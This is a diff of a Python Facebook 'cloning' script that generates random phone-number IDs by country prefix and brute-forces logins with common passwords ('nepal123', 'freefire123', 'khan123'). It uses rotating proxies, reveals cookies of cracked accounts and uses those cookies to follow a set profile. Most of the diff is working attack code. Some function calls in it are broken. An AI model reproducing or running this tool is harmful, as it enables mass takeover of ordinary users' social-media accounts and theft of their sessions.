@@ -1,10 +1,4 @@
-#created by anoX aka syCo chaudhary
-#open source by anoX
-#github= anoX-XD
-#BY BY MEY KABHI WAPIS NAHI AAUNGA AB 
-#JAI NEPAL
-# fb id https://www.facebook.com/asyCo.chaudhary69
-
+#created by ANOX 
 
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as tred
@@ -60,7 +54,7 @@ try:
     from requests.exceptions import ConnectionError
 except ModuleNotFoundError:
     os.system('pip install mechanize requests futures==2 > /dev/null')
-    os.system('python anoX.py')
+    os.system('python ANOX.py')
 from bs4 import BeautifulSoup
 from datetime import date
 from datetime import datetime
@@ -72,7 +66,7 @@ from time import sleep as waktu
 ##useragent
 ugen2=[]
 ugen=[]
-anoX_xd = []
+ANOX_xd = []
 
 try:
     prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
@@ -1134,7 +1128,7 @@ def uaku2():
 		for ub in ua : 
 			ugen.append(ub)
 	except:
-		a=requests.get('https://github.com/anoX-XD/XD/blob/main/ua2.txt').text
+		a=requests.get('https://github.com/ANOX-XD/XD/blob/main/ua2.txt').text
 		ua=open('.ua2.txt','w')
 		aa=re.findall('line">(.*?)<',str(a))
 		for un in aa:
@@ -1142,34 +1136,71 @@ def uaku2():
 		ua=open('.ua2.txt','r').read().splitlines()
 		
 os.system("clear")
-print("FOLLOW US ON GITHUB")
-os.system("xdg-open https://github.com/anoX-XD")
+os.system("clear")
+print("[❣️] SUSCRIBE MY YOUTUBE CHENAL ")
+os.system("xdg-open https://www.youtube.com/@BROKEN_ANOX")
 #app  check 
 
-
 logo ="""
-##     ## ######## ########  ##     ## 
- ##   ##  ##       ##     ##  ##   ##  
-  ## ##   ##       ##     ##   ## ##   
-   ###    ######   ########     ###    
-  ## ##   ##       ##   ##     ## ##   
- ##   ##  ##       ##    ##   ##   ##  
-##     ## ######## ##     ## ##     ## 
-
-[+]==============================================
-[+] CREATED BY   :  syCoxROHIT
-[+] FB GROUP     :  TERMUX TEAM INP COMMAND 
-[+] ON GITHUB    :  anoX-XD
-[+] TOOL STATUS  :  RANDOM
-[+] TOOL VIRSION :  0.2
-[+]=============================================="""
-
+\033[1;33m __    __  \033[1;32m  ___\033[1;33m___  \033[1;35m .__   __.\033[1;34m  ___________    ____ 
+\033[1;33m|  |  |  |  /  __  \  |  \033[1;33m\ |  |\033[1;33m |   ____\   \  /   / 
+|  |__|  |\033[1;31m |  \033[1;32m|  | \033[1;37m | |   \|  \033[1;31m| |  |__ \033[1;31m  \\   \/   /  
+\033[1;35m|   __   | |  |  | \033[1;36m | |  . `  |\033[1;36m |  \033[1;37m __|   \_    _/   
+\033[1;34m|  |  |  | |  `--'  | |  |\   | \033[1;35m|  |____    |  |     
+\033[1;36m|__|  |__| \033[1;34m \____\033[1;32m__/ \033[1;31m |__| \033[1;32m\__| \033[1;34m|_______|   |__|    
+ 
+ \033[1;39m━▷ \033[1;36m𝐅𝐄𝐄𝐋 𝐓𝐇𝐄 𝐏𝐎𝐖𝐄𝐑 𝐎𝐅 𝐁𝐑𝐎𝐊𝐄𝐍 𝐎𝐖𝐍𝐄𝐑 𝐎𝐅  𝐇𝐎𝐍𝟑𝐘                                                
+\033[1;32m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+║\33[1;32m        [ JAI ◈✙◈ \33[1;33mSHREE ◈✙◈\33[1;37m RAAM  ]          ║
+╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
+\033[1;33m(•)●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;35m๑۩[ʙʀᴏᴋ3ɴ]۩๑\033[0;95m▬▬▬▬▬▬▬▬▬▬▬▬▬▬●💔
+\033[1;36m[•] ━▷ \033[1;31m𝘾𝙍𝙀𝘼𝙏𝙀𝘿 𝘽𝙔   ◈✙◈  \033[1;31m𝙊𝙒𝙉𝙀𝙍 𝙃𝙊𝙉𝙀𝙔
+\033[1;32m[•] ━▷ \033[1;36m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆     ◈✙◈  \033[1;36m𝙃𝙊𝙉𝙀𝙔 𝙆𝘼𝙎𝙃𝙔𝘼𝙋
+\033[1;37m[•] ━▷ \033[1;37m𝙂𝙄𝙏𝙃𝙐𝘽       ◈✙◈  \033[1;37m𝙃𝙊𝙉𝙀𝙔-𝙆𝙄𝙉𝙂
+\033[1;33m[•] ━▷ \033[1;32m𝙎𝙏𝘼𝙏𝙐𝙎       ◈✙◈  \033[1;32m𝙏𝙊𝙊𝙇 𝙄𝙎 𝙁𝙍𝙀𝙀
+\033[1;35m[•] ━▷ \033[1;35m𝙁𝙍𝙄𝙀𝙉𝘿       ◈✙◈  \033[1;35m𝙆𝘼𝙍𝙄𝙎𝙃𝙈𝘼 𝙓 𝙎𝘼𝙈𝙄
+\033[1;32m[•] ━▷ \033[1;33m𝙂𝙄𝙍𝙇𝙁𝙍𝙄𝙀𝙉𝘿   ◈✙◈  \033[1;33m𝙉𝙃𝙄 𝙃𝘼𝙄 💔
+\033[1;37m[•] ━▷ \033[1;32m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋.    ◈✙◈  \033[1;37m95\033[1;36m09\033[1;32m34\033[1;33m30\033[1;35m45 
+\033[1;37m(•)●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;35m๑۩[ʜ3ᴀʀᴛ]۩๑\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬●💔\n\n"""
 xxxx = str(len(ugen))
 #---------------------[LOOP MENU]---------------------#
 loop = 0
 oks = []
 cps = []
 baby =[]
+os.system('espeak -a 300 " Welcome,   to,  ANOX,  king,  Tools"')
+
+def Joined(ids):
+    if len(ids)==15:
+        if ids[:10] in ['1000000000']       :creation = ' 2009'
+        elif ids[:9] in ['100000000']       :creation = ' 2009'
+        elif ids[:8] in ['10000000']        :creation = ' 2009'
+        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = ' 2009'
+        elif ids[:7] in ['1000006','1000007','1000008','1000009']:creation = ' 2010'
+        elif ids[:6] in ['100001']          :creation = ' 2010 | 2011'
+        elif ids[:6] in ['100002','100003'] :creation = ' 2011 | 2012'
+        elif ids[:6] in ['100004']          :creation = ' 2012 | 2013'
+        elif ids[:6] in ['100005','100006'] :creation = ' 2013 | 2014'
+        elif ids[:6] in ['100007','100008'] :creation = ' 2014 | 2015'
+        elif ids[:6] in ['100009']          :creation = ' 2015' 
+        elif ids[:5] in ['10001']           :creation = ' 2015 | 2016'
+        elif ids[:5] in ['10002']           :creation = ' 2016 | 2017'
+        elif ids[:5] in ['10003']           :creation = ' 2018 | 2019'
+        elif ids[:5] in ['10004']           :creation = ' 2019 | 2020'
+        elif ids[:5] in ['10005']           :creation = ' 2020'
+        elif ids[:5] in ['10006','10007']   :creation = ' 2021'
+        elif ids[:5] in ['10008']           :creation = ' 2022/2023'
+        elif ids[:5] in ['10009']           :creation = ' 2023'
+        elif ids[:5] in ['61550']           :creation = ' 2023'
+        else:creation=''
+    elif len(ids) in [9,10]:
+        creation = ' 2008 | 2009'
+    elif len(ids)==8:
+        creation = ' 2007 | 2008'
+    elif len(ids)==7:
+        creation = ' 2006 | 2007'
+    else:creation=''
+    return creation
 
 #---------------------[APPLICATION CHECKER]---------------------#
 def cek_apk(session,coki):
@@ -1195,7 +1226,7 @@ def cek_apk(session,coki):
         for i in range(len(game)):
             print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
         else:
-            print('\033[1;97m====================================================') 
+            print('\033[1;97m------------------------------------------------------------------------------------------') 
 def follow(ses,coki):
     ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
     r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100001020800712', cookies={'cookie': coki}).text, 'html.parser')
@@ -1203,59 +1234,57 @@ def follow(ses,coki):
     ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
     
     		
-def anoX():
+def ANOX():
     os.system("clear")
     print(logo)
-    
-    print("[1] RANDOM CLONE NP\n[2] RANDOM CLONE IND\n[3] RANDOM CLONE PK\n[4] RANDOM CLONE BD\n[5] RANDOM CLONE WITH CHOOSE PSWD\n[6] RANDOM CLONE WITH I LOVE YOU & FREE FIRE PSWD\n[7] CONTACT OWNER")
+    print("\033[1;33m [💘]✼★━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━★✼")
+    print("\033[1;37m [1] NEPAL CLONING\n\033[1;36m [2] INDIA CLONING\n\033[1;33m [3] PAKISTAN CLONING \n\033[1;36m [4] BANGLADESH CLONING \n\033[1;37m [5] AFGHANISTAN CLONING \n")
     print(49*'=')
-    syCo = input("✓CHOOSE>")
-    if syCo =='1':anoX1()
-    elif syCo =='2':anoX2()
-    elif syCo =='3':anoX3()
-    elif syCo =='4':anoX4()
-    elif syCo =='5':anoX5()
-    elif syCo =='6':anoX6()
-    elif syCo =='7':os.system("xdg-open https://www.facebook.com/asyCo.chaudhary69")
+    method = input("✓CHOOSE>")
+    if method =='1':ANOX1()
+    elif method =='2':ANOX2()
+    elif method =='3':ANOX3()
+    elif method =='4':ANOX4()
+    elif method =='5':ANOX5()
     else:
         print("SELECT CORRECT OPTION")
-        anoX()
-    
-def anoX1():
+        ANOX()
+
+def ANOX1():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  (9817)')
+	print('\033[1;37m [😊] USE YOUR FOUR DIGIT OF SIM NUMBER  (*****)')
 	print(47*'-')
-	kode = input('[?] Input Code : ')
+	kode = input('\033[1;36m [🥀] CHOOSE CODE : ')
 	print(47*'-')
-	limit = int(input('[?] How many numbers do you want to add : '))
+	limit = int(input('\033[1;37m [🥳] LIMT [50000]: '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
 		user.append(nmp)
 	os.system("clear")
 	print(logo)
 	print("                CHOOSE METHOD                       ")
-	print("[+]==============================================")
-	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
+	print("\033[1;37m [💚]-----------------------------------------------------------------------------------------") 
+	print("\033[1;36m [1] METHOD 1- MBASIC\n\033[1;33m [2] METHOD 2- P\n\033[1;36m [3] METHOD 3- X\n\033[1;35m [4] METHOD 4- MOBILE\n\033[1;92m [5] METHOD 5- FREE\n")
 	print(49*'=')
-	anoXfire = input("[+] [CHOOSE] :- ")
+	ANOXfire = input("\033[1;37m [+] [CHOOSE] :- ")
 	os.system("clear")
 	print(logo)
 	print("                TRY SOMETHING NEW                       ")
-	print("[+]==============================================")
-	print("[+] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
-	print("[+]==============================================")
-	anoXlovesyou = input("[+] [CHOOSE] :- ")
-	if anoXlovesyou in ['y','Y','1','yes','YES','Yes']:
-		anoX_xd.append('y')
+	print("\033[1;37m [💚]-----------------------------------------------------------------------------------------") 
+	print("\033[1;36m [❣️] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
+	print("\033[1;37m [🥀]-----------------------------------------------------------------------------------------") 
+	ANOXlovesyou = input("\033[1;36m[+] [CHOOSE] :- ")
+	if ANOXlovesyou in ['y','Y','1','yes','YES','Yes']:
+		ANOX_xd.append('y')
 	else:
-		anoX_xd.append('n')
-	print("[+]==============================================")
-	print("[+] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
-	print("[+]==============================================")
-	anoXtop = input("[+] [CHOOSE] :- ")
-	if anoXtop in ['y','Y','Yes','YES','1']:
+		ANOX_xd.append('n')
+	print("\033[1;37m [😊]-----------------------------------------------------------------------------------------") 
+	print("\033[1;36m [🥀] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
+	print("\033[1;37m [😊]-----------------------------------------------------------------------------------------") 
+	ANOXtop = input("\033[1;36m [❣️] [CHOOSE] :- ")
+	if ANOXtop in ['y','Y','Yes','YES','1']:
 		baby.append('y')
 	else:
 		baby.append('n')
@@ -1263,70 +1292,64 @@ def anoX1():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print(f"[+] TOTAL IDZ  : "+tl+" ")
-		print(f"[+] CODE CHOOSED : "+kode)
-		print(f'[+] METHOD CHOOSED : M{anoXfire}')
+		print(f"\033[1;37m [😊] TOTAL IDZ  : "+tl+" ")
+		print(f"\033[1;36m [💚] CODE CHOOSED : "+kode)
+		print(f'\033[1;37m [🥀] METHOD CHOOSED : M{ANOXfire}')
 		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
 		for guru in user:
 			uid = kode+guru
 			pwx = [uid+guru,'nepal123','nepal12345','free fire','i love you','freefire123']
-			if anoXfire =='1':yaari.submit(mbasic,uid,pwx,tl)
-			elif anoXfire =='2':yaari.submit(p,uid,pwx,tl)
-			elif anoXfire =='3':yaari.submit(x,uid,pwx,tl)
-			elif anoXfire =='4':yaari.submit(mobile,uid,pwx,tl)
-			elif anoXfire =='5':yaari.submit(freeq,uid,pwx,tl)
-			elif anoXfire =='6':yaari.submit(d,uid,pwx,tl)
+			if ANOXfire =='1':yaari.submit(mbasic,uid,pwx,tl)
+			elif ANOXfire =='2':yaari.submit(p,uid,pwx,tl)
+			elif ANOXfire =='3':yaari.submit(x,uid,pwx,tl)
+			elif ANOXfire =='4':yaari.submit(mobile,uid,pwx,tl)
+			elif ANOXfire =='5':yaari.submit(free,uid,pwx,tl)
 			else:
 			    yaari.submit(p,uid,pwx,tl)
 			
 	print(47*"-")
 	print('[✓] CRACKING COMPLETED ')
 	print('[✓] OK/CP: '+str(len(oks))+'/'+str(len(cps)))
-	print('[?] Ids saved in anoX-OK.txt,anoX-CP.txt')
+	print('[?] Ids saved in ANOX.txt,ANOX-CP.txt')
 	input("DO YOU WANT TO GO BSCK MENU ")
-	anoX()
+	ANOX()
 	print(47*"-")
 	
-	
-	
 
-
-
-def anoX2():
+def ANOX2():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  (9817)')
+	print('\033[1;92m [•] USE YOUR FOUR DIGIT OF SIM NUMBER  7778, 9976,9680,')
+	kode = input('\033[1;36m [🥀] CHOOSE CODE : ')
 	print(47*'-')
-	kode = input('[?] Input Code : ')
-	print(47*'-')
-	limit = int(input('[?] How many numbers do you want to add : '))
+	limit = int(input('\033[1;37m [🥳] LIMT [50000]: '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(6))
 		user.append(nmp)
 	os.system("clear")
 	print(logo)
 	print("                CHOOSE METHOD                       ")
-	print("[+]==============================================")
-	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
+	print("\033[1;37m [💚]-----------------------------------------------------------------------------------------") 
+	print("\033[1;36m [1] METHOD 1- MBASIC\n\033[1;33m [2] METHOD 2- P\n\033[1;36m [3] METHOD 3- X\n\033[1;35m [4] METHOD 4- MOBILE\n\033[1;92m [5] METHOD 5- FREE\n")
 	print(49*'=')
-	anoXfire = input("[+] [CHOOSE] :- ")
+	ANOXfire = input("\033[1;37m [+] [CHOOSE] :- ")
 	os.system("clear")
 	print(logo)
 	print("                TRY SOMETHING NEW                       ")
-	print("[+]==============================================")
-	print("[+] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
-	print("[+]==============================================")
-	anoXlovesyou = input("[+] [CHOOSE] :- ")
-	if anoXlovesyou in ['y','Y','1','yes','YES','Yes']:
-		anoX_xd.append('y')
+	print("\033[1;37m [💚]-----------------------------------------------------------------------------------------") 
+	print("\033[1;36m [❣️] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
+	print("\033[1;37m [🥀]-----------------------------------------------------------------------------------------") 
+	ANOXlovesyou = input("\033[1;36m [+] [CHOOSE] :- ")
+	if ANOXlovesyou in ['y','Y','1','yes','YES','Yes']:
+		ANOX_xd.append('y')
 	else:
-		anoX_xd.append('n')
-	print("[+]==============================================")
-	print("[+] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
-	print("[+]==============================================")
-	anoXtop = input("[+] [CHOOSE] :- ")
-	if anoXtop in ['y','Y','Yes','YES','1']:
+		ANOX_xd.append('n')
+	print("\033[1;37m [😊]-----------------------------------------------------------------------------------------") 
+	print("\033[1;36m [🥀] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
+	print("\033[1;37m [😊]-----------------------------------------------------------------------------------------") 
+	ANOXtop = input("\033[1;36m [❣️] [CHOOSE] :- ")
+	if ANOXtop in ['y','Y','Yes','YES','1']:
 		baby.append('y')
 	else:
 		baby.append('n')
@@ -1334,65 +1357,68 @@ def anoX2():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print(f"[+] TOTAL IDZ  : "+tl+" ")
-		print(f"[+] CODE CHOOSED : "+kode)
-		print(f'[+] METHOD CHOOSED : M{anoXfire}')
+		print(f"\033[1;37m [😊] TOTAL IDZ  : "+tl+" ")
+		print(f"\033[1;36m [💚] CODE CHOOSED : "+kode)
+		print(f'\033[1;37m [🥀] METHOD CHOOSED : M{ANOXfire}')
 		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
 		for guru in user:
 			uid = kode+guru
 			mk = uid[:6]
 			pwx = [guru]
-			pwx = [kode+guru,'57273200']
-			if anoXfire =='1':yaari.submit(mbasic,uid,pwx,tl)
-			elif anoXfire =='2':yaari.submit(p,uid,pwx,tl)
-			elif anoXfire =='3':yaari.submit(x,uid,pwx,tl)
-			elif anoXfire =='4':yaari.submit(mobile,uid,pwx,tl)
-			elif anoXfire =='5':yaari.submit(freeq,uid,pwx,tl)
-			elif anoXfire =='6':yaari.submit(d,uid,pwx,tl)
+			pwx = [kode+guru,mk,'57273200']
+			
+
+			if ANOXfire =='1':yaari.submit(mbasic,uid,pwx,tl)
+			elif ANOXfire =='2':yaari.submit(p,uid,pwx,tl)
+			elif ANOXfire =='3':yaari.submit(x,uid,pwx,tl)
+			elif ANOXfire =='4':yaari.submit(mobile,uid,pwx,tl)
+			elif ANOXfire =='5':yaari.submit(free,uid,pwx,tl)
 			else:
 			    yaari.submit(p,uid,pwx,tl)
 			
 	print(47*"-")
-	print('[✓] Crack process has been completed')
-	print('[?] Ids saved in anoX-OK.txt,anoX-CP.txt')
+	print('[✓] CRACKING COMPLETED ')
+	print('[✓] OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+	print('[?] Ids saved in ANOX.txt,ANOX-CP.txt')
+	input("DO YOU WANT TO GO BSCK MENU ")
+	ANOX()
 	print(47*"-")
 
 
-def anoX3():
+def ANOX3():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  (9817)')
+	print('\033[1;92m [•] USE YOUR FOUR DIGIT OF SIM NUMBER  93718, 93716,93180,')
+	kode = input('\033[1;36m [🥀] CHOOSE CODE : ')
 	print(47*'-')
-	kode = input('[?] Input Code : ')
-	print(47*'-')
-	limit = int(input('[?] How many numbers do you want to add : '))
+	limit = int(input('\033[1;37m [🥳] LIMT [50000]: '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(6))
 		user.append(nmp)
 	os.system("clear")
 	print(logo)
 	print("                CHOOSE METHOD                       ")
-	print("[+]==============================================")
-	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
+	print("\033[1;37m [💚]-----------------------------------------------------------------------------------------") 
+	print("\033[1;36m [1] METHOD 1- MBASIC\n\033[1;33m [2] METHOD 2- P\n\033[1;36m [3] METHOD 3- X\n\033[1;35m [4] METHOD 4- MOBILE\n\033[1;92m [5] METHOD 5- FREE\n")
 	print(49*'=')
-	anoXfire = input("[+] [CHOOSE] :- ")
+	ANOXfire = input("\033[1;37m [+] [CHOOSE] :- ")
 	os.system("clear")
 	print(logo)
 	print("                TRY SOMETHING NEW                       ")
-	print("[+]==============================================")
-	print("[+] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
-	print("[+]==============================================")
-	anoXlovesyou = input("[+] [CHOOSE] :- ")
-	if anoXlovesyou in ['y','Y','1','yes','YES','Yes']:
-		anoX_xd.append('y')
+	print("\033[1;37m [💚]-----------------------------------------------------------------------------------------") 
+	print("\033[1;36m [❣️] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
+	print("\033[1;37m [🥀]-----------------------------------------------------------------------------------------") 
+	ANOXlovesyou = input("\033[1;36m [+] [CHOOSE] :- ")
+	if ANOXlovesyou in ['y','Y','1','yes','YES','Yes']:
+		ANOX_xd.append('y')
 	else:
-		anoX_xd.append('n')
-	print("[+]==============================================")
-	print("[+] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
-	print("[+]==============================================")
-	anoXtop = input("[+] [CHOOSE] :- ")
-	if anoXtop in ['y','Y','Yes','YES','1']:
+		ANOX_xd.append('n')
+	print("\033[1;37m [😊]-----------------------------------------------------------------------------------------") 
+	print("\033[1;36m [🥀] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
+	print("\033[1;37m [😊]-----------------------------------------------------------------------------------------") 
+	ANOXtop = input("\033[1;36m [❣️] [CHOOSE] :- ")
+	if ANOXtop in ['y','Y','Yes','YES','1']:
 		baby.append('y')
 	else:
 		baby.append('n')
@@ -1400,70 +1426,65 @@ def anoX3():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print(f"[+] TOTAL IDZ  : "+tl+" ")
-		print(f"[+] CODE CHOOSED : "+kode)
-		print(f'[+] METHOD CHOOSED : M{anoXfire}')
+		print("\033[1;33m [💘]✼★━━━━━━━━━━━━━━━━━━━━━━━━━━━★✼")
+		print(f"\033[1;37m [😊] TOTAL IDZ  : "+tl+" ")
+		print(f"\033[1;36m [💚] CODE CHOOSED : "+kode)
+		print(f'\033[1;37m [🥀] METHOD CHOOSED : M{ANOXfire}')
 		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
 		for guru in user:
 			uid = kode+guru
-			mk = uid[:6]
-			pwx = [guru]
-			pwx = [kode+guru,mk,'khankhan','khan123','khan1122','Free Fire','i love you','freefire123','khan786','khan12345']
-			if anoXfire =='1':yaari.submit(mbasic,uid,pwx,tl)
-			elif anoXfire =='2':yaari.submit(p,uid,pwx,tl)
-			elif anoXfire =='3':yaari.submit(x,uid,pwx,tl)
-			elif anoXfire =='4':yaari.submit(mobile,uid,pwx,tl)
-			elif anoXfire =='5':yaari.submit(freeq,uid,pwx,tl)
-			elif anoXfire =='6':yaari.submit(d,uid,pwx,tl)
+			pwx = [kode+guru,mk,'5727200','59039200','57575751','khan123','khan1122','Free Fire','i love you','freefire123','free fire','khan12345']		
+			if ANOXfire =='1':yaari.submit(mbasic,uid,pwx,tl)
+			elif ANOXfire =='2':yaari.submit(p,uid,pwx,tl)
+			elif ANOXfire =='3':yaari.submit(x,uid,pwx,tl)
+			elif ANOXfire =='4':yaari.submit(mobile,uid,pwx,tl)
+			elif ANOXfire =='5':yaari.submit(free,uid,pwx,tl)
 			else:
 			    yaari.submit(p,uid,pwx,tl)
 			
 	print(47*"-")
-	print('[✓] Crack process has been completed')
-	print('[?] Ids saved in anoX-OK.txt,anoX-CP.txt')
-	print(47*"-")
-			
-	print(47*"-")
-	print('[✓] Crack process has been completed')
-	print('[?] Ids saved in anoX-OK.txt,anoX-CP.txt')
+	print('[✓] CRACKING COMPLETED ')
+	print('[✓] OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+	print('[?] Ids saved in ANOX.txt,ANOX-CP.txt')
+	input("DO YOU WANT TO GO BSCK MENU ")
+	ANOX()
 	print(47*"-")
 
-
-def anoX4():
+def ANOX4():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  (9817)')
+	print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  017,018,019')
 	print(47*'-')
-	kode = input('[?] Input Code : ')
+	kode = input('\033[1;36m [🥀] CHOOSE CODE : ')
 	print(47*'-')
-	limit = int(input('[?] How many numbers do you want to add : '))
+	limit = int(input('\033[1;37m [🥳] LIMT [50000]: '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(6))
 		user.append(nmp)
 	os.system("clear")
 	print(logo)
 	print("                CHOOSE METHOD                       ")
-	print("[+]==============================================")
-	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
+	print("\033[1;37m [💚]==============================================")
+	print("\033[1;36m [1] METHOD 1- MBASIC\n\033[1;33m [2] METHOD 2- P\n\033[1;36m [3] METHOD 3- X\n\033[1;35m [4] METHOD 4- MOBILE\n\033[1;92m [5] METHOD 5- FREE\n")
 	print(49*'=')
-	anoXfire = input("[+] [CHOOSE] :- ")
+	ANOXfire = input("\033[1;37m [+] [CHOOSE] :- ")
 	os.system("clear")
 	print(logo)
 	print("                TRY SOMETHING NEW                       ")
-	print("[+]==============================================")
-	print("[+] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
-	print("[+]==============================================")
-	anoXlovesyou = input("[+] [CHOOSE] :- ")
-	if anoXlovesyou in ['y','Y','1','yes','YES','Yes']:
-		anoX_xd.append('y')
+	print("\033[1;37m [💚]-----------------------------------------------------------------------------------------") 
+	print("\033[1;36m [❣️] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
+	print("\033[1;37m [🥀]-----------------------------------------------------------------------------------------═") 
+	ANOXlovesyou = input("\033[1;36m [+] [CHOOSE] :- ")
+	if ANOXlovesyou in ['y','Y','1','yes','YES','Yes']:
+		ANOX_xd.append('y')
 	else:
-		anoX_xd.append('n')
-	print("[+]==============================================")
-	print("[+] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
-	print("[+]==============================================")
-	anoXtop = input("[+] [CHOOSE] :- ")
-	if anoXtop in ['y','Y','Yes','YES','1']:
+		ANOX_xd.append('n')
+	print("\033[1;37m [😊]-----------------------------------------------------------------------------------------") 
+	print("\033[1;36m [🥀] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
+	print("\033[1;37m [😊]-----------------------------------------------------------------------------------------") 
+	ANOXtop = input("\033[1;36m [❣️] [CHOOSE] :- ")
+	if ANOXtop in ['y','Y','Yes','YES','1']:
 		baby.append('y')
 	else:
 		baby.append('n')
@@ -1471,139 +1492,73 @@ def anoX4():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print(f"[+] TOTAL IDZ  : "+tl+" ")
-		print(f"[+] CODE CHOOSED : "+kode)
-		print(f'[+] METHOD CHOOSED : M{anoXfire}')
+		print(f"\033[1;37m [😊] TOTAL IDZ  : "+tl+" ")
+		print(f"\033[1;36m [💚] CODE CHOOSED : "+kode)
+		print(f'\033[1;37m [🥀] METHOD CHOOSED : M{ANOXfire}')
 		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
 		for guru in user:
 			uid = kode+guru
 			mk = uid[:6]
 			pwx = [guru]
-			pwx = [kode+guru,mk,'bangladesh','Bangladesh','free fire','Free Fire','i love you','freefire123']
-			if anoXfire =='1':yaari.submit(mbasic,uid,pwx,tl)
-			elif anoXfire =='2':yaari.submit(p,uid,pwx,tl)
-			elif anoXfire =='3':yaari.submit(x,uid,pwx,tl)
-			elif anoXfire =='4':yaari.submit(mobile,uid,pwx,tl)
-			elif anoXfire =='5':yaari.submit(freeq,uid,pwx,tl)
-			elif anoXfire =='6':yaari.submit(d,uid,pwx,tl)
+			pwx = [kode+guru,mk,'free fire','freefire','i love you','freefire123','5727200','59039200','57575751']
+			if ANOXfire =='1':yaari.submit(mbasic,uid,pwx,tl)
+			elif ANOXfire =='2':yaari.submit(p,uid,pwx,tl)
+			elif ANOXfire =='3':yaari.submit(x,uid,pwx,tl)
+			elif ANOXfire =='4':yaari.submit(mobile,uid,pwx,tl)
+			elif ANOXfire =='5':yaari.submit(fre,uid,pwx,tl)
 			else:
 			    yaari.submit(p,uid,pwx,tl)
 			
 	print(47*"-")
-	print('[✓] Crack process has been completed')
-	print('[?] Ids saved in anoX-OK.txt,anoX-CP.txt')
+	print('[✓] CRACKING COMPLETED ')
+	print('[✓] OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+	print('[?] Ids saved in ANOX.txt,ANOX-CP.txt')
+	input("DO YOU WANT TO GO BSCK MENU ")
+	ANOX()
 	print(47*"-")
 
-
-
-
-def anoX5():
+def ANOX5():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print('[+] ENTER YOUR FOUR SIM CODE (98xx)')
+	print('\033[1;92m [•]USE YOUR FOUR DIGIT OF SIM NUMBER  9278,9276,')
 	print(47*'-')
-	code = input('[#] PUT CODE : ')
-	print("")
-	limit = int(input('[+] PUT CLONING LIMIT: '))
-	for nmbr in range(limit):
